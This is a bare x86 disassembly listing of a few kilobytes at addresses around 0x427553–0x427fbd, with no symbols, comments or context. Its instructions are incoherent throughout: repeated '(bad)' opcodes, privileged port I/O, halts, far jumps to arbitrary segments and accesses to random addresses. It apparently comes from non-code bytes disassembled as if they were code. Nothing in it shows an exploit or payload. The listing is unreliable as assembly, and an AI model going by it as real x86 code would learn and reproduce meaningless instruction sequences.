  427553:	dec    ebx
  427554:	loop   0x42754e
  427556:	and    eax,0xef3bca58
  42755b:	dec    eax
  42755c:	in     al,0x78
  42755e:	out    dx,al
  42755f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  427561:	pop    eax
  427562:	mov    ecx,0xf5ee5743
  427567:	jb     0x427565
  427569:	jmp    0x427566
  42756b:	inc    eax
  42756c:	mov    bl,0x32
	...
  4275d6:	pop    esp
  4275d7:	test   al,0xc0
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	cmp    ebp,esp
  4275e4:	push   ds
  4275e5:	xor    al,0x67
  4275e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	or     al,bh
  4275f0:	pop    eax
  4275f1:	ins    BYTE PTR es:[edi],dx
  4275f2:	or     ecx,DWORD PTR [edi+0xf039b88]
  4275f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275f9:	imul   esp,DWORD PTR [eax+eax*2-0x4d215e11],0x5eef9b0c
  427604:	in     al,dx
  427605:	scas   al,BYTE PTR es:[edi]
  427606:	sar    DWORD PTR [ebp-0x34550231],cl
  42760c:	mov    esi,0xedb60337
  427611:	dec    eax
  427612:	das    
  427613:	jecxz  0x427675
  427615:	mov    cl,0x4b
  427617:	or     ebp,DWORD PTR [ecx+0x7e8137b0]
  42761d:	jae    0x427682
  42761f:	fldln2 
  427621:	jp     0x4275a4
  427623:	sar    DWORD PTR [eax+0x5f],0x3d
  427627:	xlat   BYTE PTR ds:[ebx]
  427628:	lock shl DWORD PTR [esi+ecx*4-0x5662241c],1
  427630:	jle    0x4275f1
  427632:	jns    0x427638
  427634:	in     eax,0xb9
  427636:	pop    ecx
  427637:	inc    esi
  427638:	test   BYTE PTR [edi],ah
  42763a:	add    BYTE PTR [ecx],bh
  42763c:	mov    dl,BYTE PTR [eax]
  42763e:	mov    ebx,0x6465b477
  427643:	ss mov dl,0xdc
  427646:	cmp    al,0x5b
  427648:	out    0x9a,eax
  42764a:	jae    0x427645
  42764c:	dec    esi
  42764d:	enter  0xfb25,0x36
  427651:	xchg   BYTE PTR [ebp-0x6700edc5],bl
  427657:	mov    dl,0x23
  427659:	(bad)  
  42765a:	ins    BYTE PTR es:[edi],dx
  42765b:	or     al,BYTE PTR ds:0x8754e17e
  427661:	int3   
  427662:	mov    eax,0x928c2842
  427667:	loopne 0x42768c
  427669:	(bad)  
  42766a:	in     eax,dx
  42766b:	bound  ebp,QWORD PTR [esi]
  42766d:	pop    ebp
  42766e:	mov    eax,0x9c053fa5
  427673:	inc    esp
  427674:	xor    esi,DWORD PTR [edi-0x7d]
  427677:	pop    esi
  427678:	pop    esi
  427679:	push   esp
  42767a:	pop    ds
  42767b:	xchg   edi,eax
  42767c:	xchg   edx,eax
  42767d:	stos   DWORD PTR es:[edi],eax
  42767e:	jmp    0xdedd:0xd3657611
  427685:	dec    eax
  427686:	in     al,dx
  427687:	out    0x64,eax
  427689:	imul   ebp,DWORD PTR [ebp-0x3b],0x719aca77
  427690:	mov    al,0x12
  427692:	xchg   edx,eax
  427693:	jl     0x427690
  427695:	(bad)  
  427696:	jmp    0x4276c8
  427698:	sbb    DWORD PTR [eax],ebx
  42769a:	mov    ecx,0x279b4d6e
  42769f:	hlt    
  4276a0:	mov    cl,0xbb
  4276a2:	sbb    al,0x15
  4276a4:	jne    0x4276cc
  4276a6:	icebp  
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	pop    eax
  4276a9:	adc    ch,dh
  4276ab:	fs mov eax,0x36923d40
  4276b1:	pop    ebp
  4276b2:	sbb    eax,0x2d09fa8e
  4276b7:	por    mm2,mm5
  4276ba:	xchg   edx,eax
  4276bb:	pop    eax
  4276bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276bd:	sub    ch,BYTE PTR [ebx-0x710ef173]
  4276c3:	das    
  4276c4:	sub    dh,BYTE PTR [edi+0x16]
  4276c7:	mov    WORD PTR [ebx+0x43],gs
  4276ca:	pop    es
  4276cb:	pop    es
  4276cc:	add    al,0x13
  4276ce:	sbb    eax,0xe8e692b8
  4276d3:	add    al,0x24
  4276d5:	aaa    
  4276d6:	mov    dh,0xc
  4276d8:	cwde   
  4276d9:	mov    esp,0x78934463
  4276de:	cmp    eax,0x36879e40
  4276e3:	lahf   
  4276e4:	add    ecx,edx
  4276e6:	xchg   esp,eax
  4276e7:	(bad)  [eax-0x1f]
  4276ea:	push   esi
  4276eb:	ins    DWORD PTR es:[edi],dx
  4276ec:	cwde   
  4276ed:	add    BYTE PTR [bx+si],al
	...
  427754:	add    BYTE PTR [eax],al
  427756:	add    DWORD PTR [esi-0x70],edx
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fstp   DWORD PTR [ebp+0x67c669e7]
  427767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427768:	add    DWORD PTR [eax],eax
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	sbb    DWORD PTR [eax-0x71],edi
  427771:	and    cl,BYTE PTR [ecx+esi*2-0x4eb7f84]
  427778:	scas   eax,DWORD PTR es:[edi]
  427779:	xchg   ah,ah
  42777b:	pop    esp
  42777c:	sbb    al,0xd7
  42777e:	xchg   edx,eax
  42777f:	push   ebp
  427780:	cmc    
  427781:	mov    WORD PTR [edx+eiz*2],ss
  427784:	xchg   BYTE PTR [ecx],dl
  427786:	in     al,dx
  427787:	push   ecx
  427788:	scas   eax,DWORD PTR es:[edi]
  427789:	xchg   edx,eax
  42778a:	push   eax
  42778b:	(bad)  
  42778c:	(bad)  [edi-0x15]
  42778f:	push   eax
  427790:	cmp    dh,BYTE PTR [ebx+eax*8]
  427793:	cmp    eax,0x24cf52ae
  427798:	scas   eax,DWORD PTR es:[edi]
  427799:	in     al,0x23
  42779b:	or     al,0x31
  42779d:	adc    BYTE PTR [ecx-0x79],bl
  4277a0:	inc    eax
  4277a1:	std    
  4277a2:	fiadd  DWORD PTR [eax]
  4277a4:	lahf   
  4277a5:	mov    ah,0x54
  4277a7:	pop    es
  4277a8:	sub    ebp,DWORD PTR [edx+0x1f999b45]
  4277ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277af:	and    BYTE PTR [edx-0x2b2c506d],bh
  4277b5:	sub    ah,BYTE PTR [eax+0x1d88e76a]
  4277bb:	cmp    BYTE PTR ds:0xc1aad1b7,al
  4277c1:	sub    ah,BYTE PTR [esi+edx*2-0x5f4d5094]
  4277c8:	jnp    0x4277a7
  4277ca:	inc    edi
  4277cb:	sbb    al,0x94
  4277cd:	push   esp
  4277ce:	iret   
  4277cf:	outs   dx,BYTE PTR ds:[esi]
  4277d0:	inc    ebp
  4277d1:	sbb    al,0x89
  4277d3:	push   edx
  4277d4:	sub    BYTE PTR [eax-0x65b98bf7],0x5
  4277db:	sbb    DWORD PTR [edx*2+0x14f34bce],esi
  4277e2:	jp     0x4277b6
  4277e4:	ins    DWORD PTR es:[edi],dx
  4277e5:	xchg   ebp,eax
  4277e6:	cld    
  4277e7:	inc    eax
  4277e8:	js     0x427837
  4277ea:	mov    ebx,0x8e9bc5e6
  4277ef:	leave  
  4277f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277f1:	clc    
  4277f2:	mov    WORD PTR [edx+0x3cf43c65],cs
  4277f8:	scas   al,BYTE PTR es:[edi]
  4277f9:	ret    
  4277fa:	fwait
  4277fb:	enter  0xa9d4,0x8f
  4277ff:	mov    esp,0xdacc0b79
  427804:	mov    dh,0x7a
  427806:	jle    0x427848
  427808:	pop    esp
  427809:	(bad)  
  42780a:	push   eax
  42780b:	mov    al,ds:0xb8bd03f1
  427810:	inc    ebp
  427811:	cmp    DWORD PTR ds:[edi+0x77],esp
  427815:	mov    ch,0xf0
  427817:	je     0x427847
  427819:	scas   eax,DWORD PTR es:[edi]
  42781a:	dec    esp
  42781b:	push   esi
  42781c:	repz add al,0xe2
  42781f:	or     eax,0xaf6478e1
  427824:	mov    esp,0xe39c12a7
  427829:	cmp    ch,BYTE PTR [esi-0x5]
  42782c:	mov    esi,0xec0e9fcb
  427831:	(bad)  
  427834:	les    edi,FWORD PTR [ebx-0x47]
  427837:	pusha  
  427838:	(bad)  
  427839:	push   es
  42783a:	int3   
  42783b:	dec    esp
  42783c:	cli    
  42783d:	in     eax,dx
  42783e:	ss jb  0x4277d1
  427841:	ret    0x3625
  427844:	xor    DWORD PTR [eax-0x78a0b842],esp
  42784a:	push   ebp
  42784b:	or     eax,0xdff32ec9
  427850:	in     eax,dx
  427851:	xchg   esp,eax
  427852:	shr    BYTE PTR [eax+0x4e],cl
  427855:	jge    0x427842
  427857:	jnp    0x4277da
  427859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42785a:	or     al,0xf0
  42785c:	mov    al,ds:0xdb469bfd
  427861:	add    eax,0xae20d888
  427866:	cs shl al,cl
  427869:	in     eax,dx
  42786a:	xor    al,0xfa
  42786c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42786d:	fwait
	...
  4278d6:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  4278dc:	pop    esi
  4278dd:	fbstp  TBYTE PTR [eax+0x65]
  4278e0:	fldl2e 
  4278e2:	dec    eax
  4278e3:	adc    eax,0xa867d852
  4278e8:	add    DWORD PTR [eax],eax
  4278ea:	add    BYTE PTR [ecx],al
  4278ec:	add    BYTE PTR [eax],al
  4278ee:	add    al,BYTE PTR [esi]
  4278f0:	mov    bl,dl
  4278f2:	icebp  
  4278f3:	shl    eax,0x11
  4278f6:	outs   dx,DWORD PTR ds:[esi]
  4278f7:	(bad)  
  4278f9:	aad    0x6a
  4278fb:	push   esi
  4278fc:	mov    WORD PTR [esi+0x7b],fs
  4278ff:	and    al,0xe8
  427901:	or     ebx,ecx
  427903:	push   ebx
  427904:	fwait
  427905:	jo     0x42788a
  427907:	mov    DWORD PTR [eax+ebp*2-0x72e76f],esi
  42790e:	mov    ds:0xc2fd3d7f,al
  427913:	retf   
  427914:	sbb    esp,ecx
  427916:	in     al,dx
  427917:	inc    edx
  427918:	out    dx,eax
  427919:	mov    eax,ds:0x1c2b05dd
  42791e:	mov    ecx,0xe15dafcf
  427923:	idiv   eax
  427925:	cmp    eax,0xbcedd7fa
  42792a:	pop    es
  42792b:	mov    ebp,0x257b5450
  427930:	sub    ebx,DWORD PTR [eax]
  427932:	xchg   ebx,eax
  427933:	test   eax,0x74fbf89a
  427938:	cdq    
  427939:	jno    0x42797f
  42793b:	fstp   DWORD PTR [esi+0x24]
  42793e:	in     eax,0x25
  427940:	pop    ebx
  427941:	lea    esp,[edx-0x54]
  427944:	sbb    DWORD PTR [esi],ebx
  427946:	push   0xa6959fd0
  42794b:	pop    es
  42794c:	pop    esi
  42794d:	sub    al,0x3
  42794f:	mov    eax,ds:0x9d62525
  427954:	ret    0xa146
  427957:	sub    eax,0x2d308a4e
  42795c:	mov    eax,ds:0x7259d257
  427961:	mov    BYTE PTR [edi],al
  427963:	fwait
  427964:	repnz addr16 test eax,0xc72ce176
  42796b:	push   edi
  42796c:	push   edi
  42796d:	fld    TBYTE PTR [eax+0x55]
  427970:	mov    al,ds:0x9b1a52cd
  427975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427976:	jo     0x4279d5
  427978:	cmp    al,0x80
  42797a:	mov    cl,0xb6
  42797c:	cmp    ecx,DWORD PTR [ebx-0x5e08ff3d]
  427982:	je     0x42791f
  427984:	jl     0x4279bf
  427986:	jl     0x427958
  427988:	mov    ch,BYTE PTR [edx+0x64]
  42798b:	inc    eax
  42798c:	mov    es:0x4569979f,eax
  427992:	imul   eax,DWORD PTR [eax],0x1
  427995:	adc    ebx,DWORD PTR [edi+0x7d]
  427998:	and    BYTE PTR [eax+0x3a],dl
  42799b:	cs fucomp st(4)
  42799e:	shl    BYTE PTR [ecx],cl
  4279a0:	pop    es
  4279a1:	lds    esi,FWORD PTR [edi+0x5f528e32]
  4279a7:	div    BYTE PTR [esi]
  4279a9:	xor    esp,DWORD PTR es:0xda2698b5
  4279b0:	retf   
  4279b1:	data16 outs dx,BYTE PTR ds:[esi]
  4279b3:	push   esi
  4279b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279b5:	(bad)  
  4279b6:	test   BYTE PTR [esi],0xca
  4279b9:	(bad)  
  4279ba:	mov    edx,0x9b1be0eb
  4279bf:	(bad)  
  4279c1:	aad    0xc0
  4279c3:	pop    edx
  4279c4:	lods   al,BYTE PTR ds:[esi]
  4279c5:	xchg   edi,eax
  4279c6:	push   esi
  4279c7:	icebp  
  4279c8:	(bad)  
  4279c9:	fwait
  4279ca:	xor    dl,BYTE PTR [edx]
  4279cc:	pop    ebx
  4279cd:	xchg   DWORD PTR [ebx-0x15],edx
  4279d0:	gs or  al,0x9e
  4279d3:	mov    eax,0xcfc01180
  4279d8:	adc    bl,BYTE PTR [ebp-0x61]
  4279db:	popa   
  4279dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279dd:	fwait
  4279de:	adc    ch,BYTE PTR [ecx]
  4279e0:	jecxz  0x4279ff
  4279e2:	aas    
  4279e3:	daa    
  4279e4:	js     0x427998
  4279e6:	das    
  4279e7:	xchg   ebp,eax
  4279e8:	cmp    al,0xc0
  4279ea:	adc    eax,0x15dd90
	...
  427a53:	add    BYTE PTR [eax],al
  427a55:	add    BYTE PTR [edx-0x5c0023],bl
  427a5b:	mov    ds:0x7542fdde,eax
  427a60:	fadd   DWORD PTR [ebx+0x659e0167]
  427a66:	addr16 test eax,0x1000001
  427a6c:	add    BYTE PTR [eax],al
  427a6e:	repnz adc DWORD PTR [esi],ecx
  427a71:	jmp    FWORD PTR [ebx-0x34c54122]
  427a77:	mov    bh,0x38
  427a79:	inc    esp
  427a7a:	jbe    0x4279ff
  427a7c:	pusha  
  427a7d:	inc    BYTE PTR [edi-0x27]
  427a80:	mov    ah,0xe8
  427a82:	fs xchg esi,eax
  427a84:	test   BYTE PTR [edi-0x1bfe381b],al
  427a8a:	jg     0x427a50
  427a8c:	icebp  
  427a8d:	cli    
  427a8e:	inc    ebp
  427a8f:	into   
  427a90:	push   esp
  427a91:	cld    
  427a92:	push   edx
  427a93:	inc    eax
  427a94:	xchg   DWORD PTR [eax-0x4c],edi
  427a97:	sub    BYTE PTR [esi],dh
  427a99:	pop    es
  427a9a:	ins    DWORD PTR es:[edi],dx
  427a9b:	or     dl,bh
  427a9d:	add    ecx,eax
  427a9f:	xchg   ebx,eax
  427aa0:	test   BYTE PTR [edi+0x7a],cl
  427aa3:	inc    esi
  427aa4:	stos   DWORD PTR es:[edi],eax
  427aa5:	push   0xeea151ea
  427aaa:	fstp   st(6)
  427aac:	add    eax,0xa603e9ec
  427ab1:	mov    ds:0x3bdab92,al
  427ab6:	inc    ecx
  427ab7:	jge    0x427b33
  427ab9:	xchg   edx,eax
  427aba:	cmp    ebx,0xffffffda
  427abd:	ja     0x427a54
  427abf:	mov    ebp,DWORD PTR [esi-0x1c]
  427ac2:	daa    
  427ac3:	arpl   WORD PTR [ebx+0x7c],ax
  427ac6:	sub    al,0x93
  427ac8:	in     eax,dx
  427ac9:	push   es
  427aca:	adc    al,0xd0
  427acc:	pop    ebx
  427acd:	loop   0x427ae4
  427acf:	mov    esp,0x4d4448e9
  427ad4:	pop    ecx
  427ad5:	push   ebp
  427ad6:	jo     0x427acf
  427ad8:	es jge 0x427ab3
  427adb:	mov    edi,0x28872b9
  427ae0:	mov    eax,0xc709712e
  427ae5:	(bad)  [eax]
  427ae7:	lock inc BYTE PTR [ecx+0x2e]
  427aeb:	push   es
  427aec:	sub    edi,DWORD PTR [edi+0x26ef73ca]
  427af2:	sub    cl,BYTE PTR [ecx-0x35e3be3c]
  427af8:	inc    esi
  427af9:	std    
  427afa:	sub    ch,0x9
  427afd:	ins    BYTE PTR es:[edi],dx
  427afe:	lock jne 0x427a94
  427b01:	ja     0x427b71
  427b03:	pop    es
  427b04:	mov    ds:0x869d78b0,eax
  427b09:	mov    ebp,0xbc6c1164
  427b0e:	jmp    0xc005:0x6dfcaddd
  427b15:	bound  edx,QWORD PTR [edx-0x50ee520a]
  427b1b:	ins    BYTE PTR es:[edi],dx
  427b1c:	aad    0xfc
  427b1e:	fiadd  WORD PTR ds:0xb18f805
  427b24:	push   ebp
  427b25:	adc    DWORD PTR ds:0x272dad10,esp
  427b2b:	and    eax,0x2c1c941c
  427b30:	sahf   
  427b31:	mov    ch,0xc4
  427b33:	mov    ebp,DWORD PTR [eax]
  427b35:	clc    
  427b36:	loope  0x427b3a
  427b38:	mov    esi,0xc39fa66c
  427b3d:	outs   dx,BYTE PTR ds:[esi]
  427b3e:	cmp    esi,DWORD PTR [esi-0x4d47a5d2]
  427b44:	sbb    dl,BYTE PTR [eax]
  427b46:	adc    al,BYTE PTR [esi]
  427b48:	mov    ecx,0xe900d2be
  427b4d:	out    dx,eax
  427b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b4f:	in     eax,0x1f
  427b51:	stos   BYTE PTR es:[edi],al
  427b52:	ret    0xe458
  427b55:	push   ds
  427b56:	jo     0x427b8a
  427b58:	sub    ch,ch
  427b5a:	sub    dh,ah
  427b5c:	repz pop ss
  427b5e:	out    0x9f,al
  427b60:	out    0x6a,eax
  427b62:	outs   dx,BYTE PTR ds:[esi]
  427b63:	fsub   st(0),st
  427b65:	xor    ah,BYTE PTR [eax+0x587dfc3d]
  427b6b:	xor    eax,DWORD PTR [edx]
  427b6d:	jg     0x427b6f
	...
  427bd3:	add    BYTE PTR [eax],al
  427bd5:	add    dl,cl
  427bd7:	mov    edx,DWORD PTR [edx+0x7b]
  427bda:	push   ebx
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	neg    BYTE PTR [ebp+0x6756bbc1]
  427be7:	stos   BYTE PTR es:[edi],al
  427be8:	add    DWORD PTR [eax],eax
  427bea:	add    BYTE PTR [ecx],al
  427bec:	add    BYTE PTR [eax],al
  427bee:	out    dx,eax
  427bef:	je     0x427c44
  427bf1:	rcl    edi,1
  427bf3:	inc    esi
  427bf4:	je     0x427beb
  427bf6:	mov    ds:0xa61c0912,al
  427bfb:	push   0xd0850909
  427c00:	or     eax,DWORD PTR [edx]
  427c02:	scas   al,BYTE PTR es:[edi]
  427c03:	jl     0x427bc5
  427c05:	outs   dx,BYTE PTR ds:[esi]
  427c06:	and    BYTE PTR [eax],cl
  427c08:	cmp    BYTE PTR [ebp-0x9],0xc6
  427c0c:	adc    BYTE PTR [ecx+eiz*1],0xd0
  427c10:	pop    esp
  427c11:	nop
  427c12:	fcomp  DWORD PTR [edi-0x7c]
  427c15:	loopne 0x427c7d
  427c17:	or     ah,BYTE PTR [edx-0x1961660f]
  427c1d:	xchg   BYTE PTR [eax+0x4ee57626],bl
  427c23:	shl    BYTE PTR [ecx-0x2d],cl
  427c26:	pop    es
  427c27:	mov    esp,0x446a4fe0
  427c2c:	and    al,0x52
  427c2e:	scas   eax,DWORD PTR es:[edi]
  427c2f:	in     eax,dx
  427c30:	jmp    0xfa890bc
  427c35:	test   BYTE PTR [edi+0x18],cl
  427c38:	ja     0x427c93
  427c3a:	mov    cs,WORD PTR [eax+esi*1]
  427c3d:	jp     0x427bcf
  427c3f:	lock mov bl,0xa3
  427c42:	xchg   ecx,eax
  427c43:	inc    esi
  427c44:	adc    ebp,ebp
  427c46:	xchg   esi,eax
  427c47:	popf   
  427c48:	cmc    
  427c49:	mov    ch,0xcf
  427c4b:	inc    edi
  427c4c:	xchg   esi,eax
  427c4d:	jno    0x427c0e
  427c4f:	sub    al,0xde
  427c51:	add    eax,0xf7125706
  427c56:	and    ebx,DWORD PTR [ebp-0x79a53970]
  427c5c:	sub    eax,0x6fae00f7
  427c61:	inc    edi
  427c62:	jns    0x427cad
  427c64:	mov    esp,0x1d2cee53
  427c69:	xor    al,0x7d
  427c6b:	stos   BYTE PTR es:[edi],al
  427c6c:	daa    
  427c6d:	lahf   
  427c6e:	and    ch,dh
  427c70:	nop
  427c71:	sub    DWORD PTR [ecx],ebx
  427c73:	stc    
  427c74:	(bad)  
  427c75:	test   al,0x95
  427c77:	jo     0x427c5f
  427c79:	out    0xf5,eax
  427c7b:	or     eax,0xed7e9276
  427c80:	sbb    dh,BYTE PTR [esi+0x742ba853]
  427c86:	int3   
  427c87:	(bad)  
  427c88:	dec    esp
  427c89:	hlt    
  427c8a:	int    0x19
  427c8c:	fsubr  DWORD PTR [esp+ebx*2-0x2f9b4644]
  427c93:	inc    ebx
  427c94:	pop    ebx
  427c95:	jne    0x427c52
  427c97:	push   ebx
  427c98:	jle    0x427c87
  427c9a:	fucomp st(3)
  427c9c:	jb     0x427caa
  427c9e:	pop    ss
  427c9f:	jmp    0x865f:0x915e3bcf
  427ca6:	jg     0x427cad
  427ca8:	leave  
  427ca9:	loope  0x427c3c
  427cab:	into   
  427cac:	inc    edx
  427cad:	pop    ebp
  427cae:	and    al,0xa8
  427cb0:	loop   0x427d24
  427cb2:	or     DWORD PTR [edi-0x9],ebp
  427cb5:	loop   0x427ce0
  427cb7:	mov    bl,BYTE PTR [ecx+esi*4+0x5a29398f]
  427cbe:	pop    ebx
  427cbf:	xchg   edx,eax
  427cc0:	rol    DWORD PTR [eax+0x5cb2955b],0xec
  427cc7:	shl    BYTE PTR [eax+0x60],cl
  427cca:	xchg   ebp,eax
  427ccb:	out    0xf1,al
  427ccd:	dec    edx
  427cce:	mov    cl,0xe4
  427cd0:	out    0xf5,eax
  427cd2:	and    al,0x7a
  427cd4:	dec    ebx
  427cd5:	adc    DWORD PTR ds:0xbf593768,edi
  427cdb:	sbb    dh,bl
  427cdd:	xchg   esi,eax
  427cde:	push   si
  427ce0:	push   ebp
  427ce1:	push   ss
  427ce2:	mov    esi,0x39a6c5af
  427ce7:	out    dx,eax
  427ce8:	inc    esp
  427ce9:	jmp    0x69bf800c
	...
  427d56:	mov    ds:0xf343b050,eax
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0xabb15d44,ebx
  427d64:	(bad)  
  427d66:	stos   DWORD PTR es:[di],eax
  427d68:	add    DWORD PTR [eax],eax
  427d6a:	add    BYTE PTR [ecx],al
  427d6c:	add    BYTE PTR [eax],al
  427d6e:	cli    
  427d6f:	fs mov edi,0x31380d5a
  427d75:	jne    0x427d6b
  427d77:	dec    ebx
  427d78:	jo     0x427df8
  427d7a:	cdq    
  427d7b:	out    0x80,eax
  427d7d:	ins    BYTE PTR es:[edi],dx
  427d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d7f:	test   DWORD PTR [edx+0x11],ebp
  427d82:	arpl   WORD PTR [ebx+0x523f3503],cx
  427d88:	jg     0x427d1b
  427d8a:	das    
  427d8b:	repz scas eax,DWORD PTR es:[edi]
  427d8d:	jge    0x427d91
  427d8f:	sbb    eax,0xb952cc23
  427d94:	add    cl,BYTE PTR [edx]
  427d96:	iret   
  427d97:	mov    dl,0x80
  427d99:	and    esp,DWORD PTR [eax-0x12]
  427d9c:	mov    al,ds:0x92baa14e
  427da1:	pop    ecx
  427da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427da3:	cmp    DWORD PTR [eax+0x5b],edi
  427da6:	aad    0x3e
  427da8:	push   0x14f25dbc
  427dad:	adc    esi,esi
  427daf:	sbb    ebp,eax
  427db1:	mov    edx,0xcf58bbfb
  427db6:	xor    edi,DWORD PTR [eax-0x3d3b44e4]
  427dbc:	mov    eax,0x7e871233
  427dc1:	mov    cl,0x14
  427dc3:	repnz push es
  427dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427dc6:	push   0x462d7289
  427dcb:	add    eax,0x532f2321
  427dd0:	add    DWORD PTR [edx-0x5c],ebp
  427dd3:	pop    esp
  427dd4:	mov    eax,0x9a731326
  427dd9:	inc    ebp
  427dda:	inc    edx
  427ddb:	pop    ebp
  427ddc:	loopne 0x427e38
  427dde:	ss out dx,eax
  427de0:	cmp    eax,0xe9e84924
  427de5:	cmp    dh,BYTE PTR [ebx-0x7f0b913e]
  427deb:	addr16 sbb al,0x6d
  427dee:	push   ecx
  427def:	xchg   ecx,ebp
  427df1:	and    al,0x30
  427df3:	leave  
  427df4:	cwde   
  427df5:	mov    ch,0x1a
  427df7:	push   eax
  427df8:	add    ch,BYTE PTR [edx+0x4ef8a18f]
  427dfe:	lods   eax,DWORD PTR ds:[esi]
  427dff:	and    bh,BYTE PTR [esi+0x4c]
  427e02:	mov    esi,0x9321a23c
  427e07:	ret    
  427e08:	add    al,0x3b
  427e0a:	push   ds
  427e0b:	arpl   WORD PTR ds:0x5c1dd216,cx
  427e11:	fsub   DWORD PTR [edi-0x6131f63a]
  427e17:	push   0x33117381
  427e1c:	push   ecx
  427e1d:	or     ebp,DWORD PTR [ebp+0x74]
  427e20:	xchg   ebx,eax
  427e21:	outs   dx,BYTE PTR ds:[esi]
  427e22:	enter  0x495b,0xc9
  427e26:	pop    esi
  427e27:	jbe    0x427e4d
  427e29:	stc    
  427e2a:	xor    eax,0xad64ee0c
  427e2f:	add    eax,DWORD PTR [edi+eax*1]
  427e32:	mov    al,ds:0x349e9a8c
  427e37:	dec    esi
  427e38:	sbb    eax,0x43caea52
  427e3d:	(bad)  
  427e3e:	jmp    0x2848:0x7e684b54
  427e45:	addr16 cmp eax,0x1f47bc71
  427e4b:	mov    ds:0x7221998,eax
  427e50:	push   ecx
  427e51:	in     al,dx
  427e52:	pop    eax
  427e53:	inc    BYTE PTR [esi+0x3957969e]
  427e59:	cmp    bl,BYTE PTR [ebp+0x21]
  427e5c:	shr    BYTE PTR [edx-0x17bf25df],0xac
  427e63:	in     eax,0x44
  427e65:	(bad)  
  427e66:	(bad)  
  427e67:	adc    DWORD PTR [eax+0x39a5f447],eax
  427e6d:	pop    edx
	...
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	sbb    DWORD PTR [ecx+ebx*8+0x1ac67d3],esi
  427ee9:	add    BYTE PTR [eax],al
  427eeb:	add    DWORD PTR [eax],eax
  427eed:	add    BYTE PTR [ecx],cl
  427eef:	test   dl,ch
  427ef1:	(bad)  
  427ef2:	hlt    
  427ef3:	lock mov dh,0x40
  427ef6:	sbb    eax,0x4d296490
  427efb:	add    al,0x9b
  427efd:	cld    
  427efe:	retf   0x7f64
  427f01:	mov    ebx,edx
  427f03:	mov    dl,0x86
  427f05:	mov    ah,0x10
  427f07:	sbb    al,BYTE PTR [ecx+0x23f50d84]
  427f0d:	fisub  DWORD PTR [ebp+0x34]
  427f10:	and    DWORD PTR [edi],0xffffffa9
  427f13:	fwait
  427f14:	call   FWORD PTR [eax+0x76]
  427f17:	pop    ebx
  427f18:	or     eax,0xda045173
  427f1d:	cmp    BYTE PTR [esi-0xb2254b0],dh
  427f23:	cmp    ebx,ecx
  427f25:	(bad)  
  427f26:	or     esp,edi
  427f28:	or     eax,0xd0ec86ad
  427f2d:	and    bl,BYTE PTR [edi-0x5ec392d0]
  427f33:	std    
  427f34:	cmp    DWORD PTR [ebx+0x4ce2e3ec],ebp
  427f3a:	mov    ds:0x2fe85dad,eax
  427f3f:	sub    BYTE PTR [edi],0x99
  427f42:	neg    BYTE PTR [eax]
  427f44:	ds in  eax,dx
  427f46:	or     eax,DWORD PTR [ebp-0x4c999a31]
  427f4c:	and    DWORD PTR [eax],edi
  427f4e:	dec    esi
  427f4f:	adc    edi,edi
  427f51:	push   edx
  427f52:	test   al,0x68
  427f54:	cmp    al,0x65
  427f56:	push   ebx
  427f57:	adc    al,BYTE PTR [ecx-0x45ad6cc3]
  427f5d:	or     DWORD PTR [ebp-0x13c9e280],0xa
  427f64:	lea    esi,[edi+ebp*8]
  427f67:	int    0xb7
  427f69:	test   eax,0xc6f6fc13
  427f6e:	jg     0x427f80
  427f70:	sti    
  427f71:	sbb    DWORD PTR [ecx+0x70],0x4a
  427f75:	pusha  
  427f76:	or     al,0xcc
  427f78:	neg    BYTE PTR [esi]
  427f7a:	xlat   BYTE PTR ds:[ebx]
  427f7b:	leave  
  427f7c:	jns    0x427f10
  427f7e:	pop    es
  427f7f:	jle    0x427fc2
  427f81:	pop    edi
  427f82:	mov    al,ds:0xda45458
  427f87:	dec    ebx
  427f88:	mov    dl,0x38
  427f8a:	pop    ds
  427f8b:	fdiv   QWORD PTR [eax]
  427f8d:	into   
  427f8e:	add    BYTE PTR gs:[eax+0x30],dh
  427f92:	sbb    eax,0xc95c21f4
  427f97:	stos   BYTE PTR es:[edi],al
  427f98:	dec    eax
  427f99:	adc    al,0xe6
  427f9b:	mov    eax,0x7e108ad8
  427fa0:	xor    al,0x99
  427fa2:	jge    0x427f5b
  427fa4:	xor    BYTE PTR [ebp+edi*2-0x25],bl
  427fa8:	std    
  427fa9:	xor    dh,BYTE PTR [edx-0x6eaa92d]
  427faf:	retf   
  427fb0:	xor    BYTE PTR [ebp+0x3d4fe648],ah
  427fb6:	call   0xc248:0xb7ce26b8
  427fbd:	mov    dl,0x69
